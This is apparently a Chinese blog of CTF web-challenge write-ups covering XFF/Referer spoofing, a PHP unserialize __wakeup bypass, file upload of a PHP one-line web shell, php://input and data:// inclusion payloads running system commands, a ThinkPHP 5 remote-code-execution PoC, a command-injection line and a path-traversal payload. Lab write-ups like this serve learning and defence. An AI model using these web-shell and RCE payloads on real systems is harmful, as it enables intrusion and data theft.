<p>-n：显示每行行号。<br>-b：显示行号，但对于空白行不进行编号。<br>-E：在每行末尾显示 $ 符号。<br>-T：将制表符字符 (\t) 显示为 ^I。<br>-s：删除重复的空行，并将连续多个空行压缩成一个空行。</p>
<p>例如，要查看文件 &#x2F;etc&#x2F;fstab 中的内容，可以执行以下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/fstab</span><br></pre></td></tr></table></figure>


<p>如果您想在行号前添加行号，可以使用 -n 选项：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat -n /etc/fstab</span><br></pre></td></tr></table></figure>



<p>该命令将显示 &#x2F;etc&#x2F;fstab 文件的内容，并在每行行首添加行号。</p>
</li>
<li><p>在已知<strong>某文件名</strong>的基础上，可使用find命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1| find / -name &quot;文件名&quot;</span><br></pre></td></tr></table></figure>

<p>在已知某部分文件名的基础上，可使用find命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1| find / -name &quot;已知文件名的部分&quot;</span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="xff-referer"><a href="#xff-referer" class="headerlink" title="xff-referer"></a>xff-referer</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>X老师告诉小宁其实xff和referer是可以伪造的。</p>
<p><img src="https://skymirror-1322371846.cos.ap-beijing.myqcloud.com/image-20231225220213290.png" alt="image-20231225220213290">                                        </p>
<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>抓包，按照提示伪造xff和referer</p>
<p><img src="https://skymirror-1322371846.cos.ap-beijing.myqcloud.com/image-20231225220430521.png" alt="image-20231225220430521"></p>
<h2 id="知识点：-3"><a href="#知识点：-3" class="headerlink" title="知识点："></a>知识点：</h2><ul>
<li><p>xff是http的拓展头部，作用是<strong>使web服务器获取访问用户的真实地址（可伪造）</strong>。由于很多用户通过代理服务器进行访问，服务器只能获取代理服务器的IP地址，而xff的作用在于记录用户的真实IP以及代理服务器的IP</p>
<p>格式为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: 本机IP，代理1IP，代理2IP,代理3IP</span><br></pre></td></tr></table></figure>
</li>
<li><p>referer是http的拓展头部，作用是记录当前请求页面的来源页面的地址。</p>
</li>
</ul>
<h1 id="unserialize3"><a href="#unserialize3" class="headerlink" title="unserialize3"></a>unserialize3</h1><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><p><img src="https://skymirror-1322371846.cos.ap-beijing.myqcloud.com/image-20231226191628422.png" alt="image-20231226191628422"></p>
<h2 id="解题过程-1"><a href="#解题过程-1" class="headerlink" title="解题过程"></a>解题过程</h2><p>代码审计：在xtcf类中构建了一个flag对象，使用了_wakeup函数，在反序列化中会先检测是否有wakeup函数，如果有则先执行里面的内容，所以在这里我们要绕过wakeup函数，可以通过增加对象属性个数来绕过</p>
<p>先完善一下该代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$flag</span> = <span class="string">&#x27;111&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">&#x27;bad requests&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>= <span class="keyword">new</span> <span class="title function_ invoke__">xctf</span>();</span><br><span class="line"><span class="keyword">print</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://c.runoob.com/compile/1/">利用菜鸟工具执行输出</a>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>为了绕过函数wakeup，增加属性个数，将1改为2</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>得解：</p>
<p><img src="https://skymirror-1322371846.cos.ap-beijing.myqcloud.com/image-20231226192852309.png" alt="image-20231226192852309"></p>
<h2 id="知识点：-4"><a href="#知识点：-4" class="headerlink" title="知识点："></a>知识点：</h2><ul>
<li>反序列化：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12507#toc-2">https://xz.aliyun.com/t/12507#toc-2</a></li>
<li>对象和类的了解</li>
</ul>
<h1 id="upload1"><a href="#upload1" class="headerlink" title="upload1"></a>upload1</h1><h2 id="题目：-3"><a href="#题目：-3" class="headerlink" title="题目："></a>题目：</h2><p><img src="https://skymirror-1322371846.cos.ap-beijing.myqcloud.com/image-20231226210912271.png" alt="image-20231226210912271"></p>
<h2 id="解题过程：-4"><a href="#解题过程：-4" class="headerlink" title="解题过程："></a>解题过程：</h2><p>法一：</p>
<p>准备好一句话木马的php文件，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=eval($_POST[&#x27;cmd&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>

<p>上传</p>
<p><img src="https://skymirror-1322371846.cos.ap-beijing.myqcloud.com/image-20231226211110624.png" alt="image-20231226211110624"></p>
<p>这个键无法使用，</p>
<p>利用开发者工具，将disable””删除</p>
<p><img src="https://skymirror-1322371846.cos.ap-beijing.myqcloud.com/image-20231226211300510.png" alt="image-20231226211300510"></p>
<p>就可以上传了</p>
<p><img src="https://skymirror-1322371846.cos.ap-beijing.myqcloud.com/image-20231226211532838.png" alt="image-20231226211532838"></p>
<p>使用蚁剑连接</p>
<p><img src="https://skymirror-1322371846.cos.ap-beijing.myqcloud.com/image-20231226211509875.png" alt="image-20231226211509875"></p>
<p><img src="https://skymirror-1322371846.cos.ap-beijing.myqcloud.com/image-20231226211623375.png" alt="image-20231226211623375"></p>
<p>法二：</p>
<p>上传准备好的php文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=eval($_POST[&#x27;cmd&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>

<p>无法上传，直接抓包，content-type改为image&#x2F;jpeg</p>
<p><img src="https://skymirror-1322371846.cos.ap-beijing.myqcloud.com/image-20231226212303421.png" alt="image-20231226212303421"></p>
<p>上传成功，接着用蚁剑连接，然后获取flag.</p>
<h1 id="web-php-include"><a href="#web-php-include" class="headerlink" title="web_php_include"></a>web_php_include</h1><h2 id="题目：-4"><a href="#题目：-4" class="headerlink" title="题目："></a>题目：</h2><p><img src="https://skymirror-1322371846.cos.ap-beijing.myqcloud.com/image-20231227191803593.png" alt="image-20231227191803593"></p>
<h2 id="解题过程：-5"><a href="#解题过程：-5" class="headerlink" title="解题过程："></a>解题过程：</h2><p>代码审计：使用了str_replace将php:&#x2F;&#x2F;覆盖掉，但是strstr区分大小写，所以我们可以大小写过滤</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?page=Php://input</span><br><span class="line">post:</span><br><span class="line">&lt;?php system(&quot;ls&quot;);?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://skymirror-1322371846.cos.ap-beijing.myqcloud.com/image-20231227192441937.png" alt="image-20231227192441937"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?page=Php://input</span><br><span class="line">post:</span><br><span class="line">&lt;?php system(&quot;cat fl4gisisish3r3.php&quot;);?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://skymirror-1322371846.cos.ap-beijing.myqcloud.com/image-20231227192627734.png" alt="image-20231227192627734"></p>
<p>法二：</p>
<p>使用**data:&#x2F;&#x2F;**伪协议</p>
<p>既然不能使用php:&#x2F;&#x2F;，那就使用其他伪协议</p>
<p><strong>data用法：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data://text/plain,xxxx(要执行的PHP代码)</span><br><span class="line">data:?/text/plain;base64,xxxx(base64编码后的数据)</span><br></pre></td></tr></table></figure>

<p>直接上payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?page=data://text/plain,&lt;?php system(&quot;ls&quot;)?&gt;</span><br><span class="line">?page=data://text/plain,&lt;?php system(&quot;cat fl4gisisish3r3.php&quot;)?&gt;</span><br></pre></td></tr></table></figure>





<h2 id="知识点：-5"><a href="#知识点：-5" class="headerlink" title="知识点："></a>知识点：</h2><ul>
<li>system的作用：执行命令并输出执行结果</li>
<li>ls作用：列出目标目录中所有子目录和文件</li>
<li>php:&#x2F;&#x2F;input，用于执行php代码，需要post请求提交数据</li>
<li>data:&#x2F;&#x2F;,用于读取数据</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/observering/p/12824794.html">参考</a></p>
<h1 id="php-rce"><a href="#php-rce" class="headerlink" title="php_rce"></a>php_rce</h1><h2 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h2><p><img src="https://skymirror-1322371846.cos.ap-beijing.myqcloud.com/image-20231227212302019.png" alt="image-20231227212302019"></p>
<h2 id="解题过程：-6"><a href="#解题过程：-6" class="headerlink" title="解题过程："></a>解题过程：</h2><p>给了一个php版本（ThinkPHP V5），在github搜索</p>
<p><img src="https://skymirror-1322371846.cos.ap-beijing.myqcloud.com/image-20231227212729557.png" alt="image-20231227212729557"></p>
<p>先用thinkphp 5的poc用一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?s=index/\think\View/display&amp;content=%22%3C?%3E%3C?php%20phpinfo();?%3E&amp;data=1</span><br></pre></td></tr></table></figure>

<p>IP地址用题目给的</p>
<p><img src="https://skymirror-1322371846.cos.ap-beijing.myqcloud.com/image-20231227212936968.png" alt="image-20231227212936968"></p>
<p>这里回显错误，提示了php的版本（5.0.20）</p>
<p>没有在github里找到5.0.20的poc,看了其他师傅的wp</p>
<p>找到poc:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</span><br></pre></td></tr></table></figure>

<p>利用该漏洞获取信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls  //检索目录</span><br><span class="line">/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=find / -name &quot;flag&quot; //找到目录名为flag的文件</span><br><span class="line">/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat /flag //查看文件内容</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<p><img src="https://skymirror-1322371846.cos.ap-beijing.myqcloud.com/image-20231227213949771.png" alt="image-20231227213949771"></p>
<h1 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h1><h2 id="题目：-5"><a href="#题目：-5" class="headerlink" title="题目："></a>题目：</h2><p><img src="https://skymirror-1322371846.cos.ap-beijing.myqcloud.com/image-20231228142132804.png" alt="image-20231228142132804"></p>
<h2 id="解题过程：-7"><a href="#解题过程：-7" class="headerlink" title="解题过程："></a>解题过程：</h2><p>查看源代码：</p>
<p><img src="https://skymirror-1322371846.cos.ap-beijing.myqcloud.com/image-20231228142225252.png" alt="image-20231228142225252"></p>
<p>访问一下source.php这个文件</p>
<p><img src="https://skymirror-1322371846.cos.ap-beijing.myqcloud.com/image-20231228142339972.png" alt="image-20231228142339972"></p>
<p>得到php文件，接下来就是代码审计了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    class emmm</span><br><span class="line">    &#123;</span><br><span class="line">        public static function checkFile(&amp;$page)</span><br><span class="line">        &#123;</span><br><span class="line">            $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];</span><br><span class="line">            if (! isset($page) || !is_string($page)) &#123;</span><br><span class="line">                echo &quot;you can&#x27;t see it&quot;;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (in_array($page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;)</span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;)</span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">            echo &quot;you can&#x27;t see it&quot;;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (! empty($_REQUEST[&#x27;file&#x27;])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[&#x27;file&#x27;])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[&#x27;file&#x27;])</span><br><span class="line">    ) &#123;</span><br><span class="line">        include $_REQUEST[&#x27;file&#x27;];</span><br><span class="line">        exit;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;</span><br><span class="line">    &#125;  </span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>



<p>浏览一下，看到有hint.php</p>
<p>不管三七二十一，直接访问</p>
<p><img src="https://skymirror-1322371846.cos.ap-beijing.myqcloud.com/image-20231228143251597.png" alt="image-20231228143251597"></p>
<p>这里提示flag在ffffllllaaaagggg文件里</p>
<p>先看最下面的代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if (! empty($_REQUEST[&#x27;file&#x27;])</span><br><span class="line">       &amp;&amp; is_string($_REQUEST[&#x27;file&#x27;])</span><br><span class="line">       &amp;&amp; emmm::checkFile($_REQUEST[&#x27;file&#x27;])</span><br><span class="line">   ) &#123;</span><br><span class="line">       include $_REQUEST[&#x27;file&#x27;];</span><br><span class="line">       exit;</span><br><span class="line">   &#125; else &#123;</span><br><span class="line">       echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;</span><br><span class="line">   &#125;  </span><br></pre></td></tr></table></figure>

<p>这里是以request的方式传入了一个参数file，要想成功执行include函数就要满足三个条件</p>
<ul>
<li>参数值不能为空</li>
<li>参数值是字符串</li>
<li>参数值能成功执行checkFile函数</li>
</ul>
<p>前两个条件很容易满足，我们就主要研究checkFile函数就好了</p>
<p>先一步一步分析</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">class emmm</span><br><span class="line">    &#123;</span><br><span class="line">        public static function checkFile(&amp;$page)</span><br><span class="line">        &#123;</span><br><span class="line">            $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];//定义参数whitelist的值</span><br><span class="line">            if (! isset($page) || !is_string($page)) &#123;</span><br><span class="line">                echo &quot;you can&#x27;t see it&quot;;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;//传入的参数page不能为空且是字符串，否则返回flase</span><br><span class="line"></span><br><span class="line">            if (in_array($page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;//page的内容必须包含在whitelist里</span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">		//如果不满足的话进行接下来的代码执行</span><br><span class="line">		</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;)</span><br><span class="line">            );//将page里第一次出现的？之前的字符串赋值给page</span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;//如果重新赋值后的page包含在whitelist里，就返回ture</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);//如果以上条件仍然不满足的话，page会经过一次url编码</span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;)</span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;//重复以上操作</span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">            echo &quot;you can&#x27;t see it&quot;;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>经过以上分析可知，要想该函数返回ture的话，就要满足以下条件</p>
<ul>
<li>传入的参数page中必须含有字符串source.php或hint.php</li>
<li>字符串source.php或hint.php后连接？+要执行的操作代码</li>
</ul>
<p>直接上payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=source.php?/../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure>

<p><img src="https://skymirror-1322371846.cos.ap-beijing.myqcloud.com/image-20231228145503216.png" alt="image-20231228145503216"></p>
<h2 id="知识点：-6"><a href="#知识点：-6" class="headerlink" title="知识点："></a>知识点：</h2><ul>
<li>$_REQUEST是通过GET，POST和COOKIE输入机制来传递参数</li>
<li>include函数的特性：</li>
</ul>
<p>看官方对include的定义</p>
<p><img src="C:\Users\30876\AppData\Roaming\Typora\typora-user-images\image-20231228155155103.png" alt="image-20231228155155103"></p>
<p>重点在于这两句话：</p>
<p><strong>被包含文件先按参数给出的路径寻找，如果没有给出目录（只有文件名）时则按照include_path 指定的目录寻找。</strong></p>
<p>如果定义了路径——不管是绝对路径（在 Windows 下以盘符或者 \ 开头，在 Unix&#x2F;Linux 下以 &#x2F; 开头）还是当前目录的相对路径（以 . 或者 .. 开头）——include_path 都会被完全忽略</p>
<p>include_path，简单理解就是类似系统中的PATH环境变量，在文件包含在没有指出路径就会在前面补充这个include_path，从而形成完整的绝对路径</p>
<p>比如：include_path设置为&#x2F;var&#x2F;www&#x2F;，在执行include “flag.txt”，路径就是&#x2F;var&#x2F;www&#x2F;flag.txt</p>
<p>由于我们构造的payload：”source.php?&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg“包含路径</p>
<p>所以会忽略include_path直接按照我们路径去寻找。</p>
<p>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42016346/article/details/104199710">https://blog.csdn.net/qq_42016346/article/details/104199710</a></p>
<ul>
<li><a target="_blank" rel="noopener" href="https://baike.baidu.com/item/in_array/4014625?fr=ge_ala">in_array</a>：在数组中搜索指定参数的值</li>
<li><a target="_blank" rel="noopener" href="https://www.runoob.com/php/func-string-mb_substr.html">mb_substr</a>：返回字符串的一部分</li>
<li><a target="_blank" rel="noopener" href="https://php.p2hp.com/manual/zh/function.mb-strpos.php">mb_strpos</a>：查找字符串在另一个字符串中首次出现的位置</li>
</ul>
<h1 id="easyphp-1"><a href="#easyphp-1" class="headerlink" title="easyphp"></a>easyphp</h1><p><img src="https://skymirror-1322371846.cos.ap-beijing.myqcloud.com/image-20240322211041319.png" alt="image-20240322211041319"></p>
<p>打开网站，得到php代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$key1 = 0;</span><br><span class="line">$key2 = 0;</span><br><span class="line"></span><br><span class="line">$a = $_GET[&#x27;a&#x27;];</span><br><span class="line">$b = $_GET[&#x27;b&#x27;];</span><br><span class="line"></span><br><span class="line">if(isset($a) &amp;&amp; intval($a) &gt; 6000000 &amp;&amp; strlen($a) &lt;= 3)&#123;</span><br><span class="line">    if(isset($b) &amp;&amp; &#x27;8b184b&#x27; === substr(md5($b),-6,6))&#123;</span><br><span class="line">        $key1 = 1;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            die(&quot;Emmm...再想想&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">    die(&quot;Emmm...&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$c=(array)json_decode(@$_GET[&#x27;c&#x27;]);</span><br><span class="line">if(is_array($c) &amp;&amp; !is_numeric(@$c[&quot;m&quot;]) &amp;&amp; $c[&quot;m&quot;] &gt; 2022)&#123;</span><br><span class="line">    if(is_array(@$c[&quot;n&quot;]) &amp;&amp; count($c[&quot;n&quot;]) == 2 &amp;&amp; is_array($c[&quot;n&quot;][0]))&#123;</span><br><span class="line">        $d = array_search(&quot;DGGJ&quot;, $c[&quot;n&quot;]);</span><br><span class="line">        $d === false?die(&quot;no...&quot;):NULL;</span><br><span class="line">        foreach($c[&quot;n&quot;] as $key=&gt;$val)&#123;</span><br><span class="line">            $val===&quot;DGGJ&quot;?die(&quot;no......&quot;):NULL;</span><br><span class="line">        &#125;</span><br><span class="line">        $key2 = 1;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;no hack&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;no&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if($key1 &amp;&amp; $key2)&#123;</span><br><span class="line">    include &quot;Hgfks.php&quot;;</span><br><span class="line">    echo &quot;You&#x27;re right&quot;.&quot;\n&quot;;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>开始代码审计</p>
<p>先传入两个参数a,b</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">if(isset($a) &amp;&amp; intval($a) &gt; 6000000 &amp;&amp; strlen($a) &lt;= 3)</span><br><span class="line">//a的值要大于6000000且a的长度要&lt;=3,所以a的值可以为7e6,即7000000</span><br><span class="line">&#123;</span><br><span class="line">	//b的md5值倒数6个字符串为8b184b</span><br><span class="line">    if(isset($b) &amp;&amp; &#x27;8b184b&#x27; === substr(md5($b),-6,6))&#123;</span><br><span class="line">        $key1 = 1;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            die(&quot;Emmm...再想想&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">    die(&quot;Emmm...&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>要求出b的值，可以写脚本得出</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">  </span><br><span class="line">$target = &#x27;8b184b&#x27;;  </span><br><span class="line">  </span><br><span class="line">for ($i = 0; $i &lt; 999999999; $i++) &#123;  </span><br><span class="line">    $b = strval($i); // 将整数转换为字符串  </span><br><span class="line">    $hash = md5($b);  </span><br><span class="line">    $suffix = substr($hash, -6);  </span><br><span class="line">      </span><br><span class="line">    if ($suffix === $target) &#123;  </span><br><span class="line">        echo &quot;找到符合条件的 b 值: $b\n&quot;;  </span><br><span class="line">        break;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://skymirror-1322371846.cos.ap-beijing.myqcloud.com/image-20240322211807253.png" alt="image-20240322211807253"></p>
<p>所以b&#x3D;53724</p>
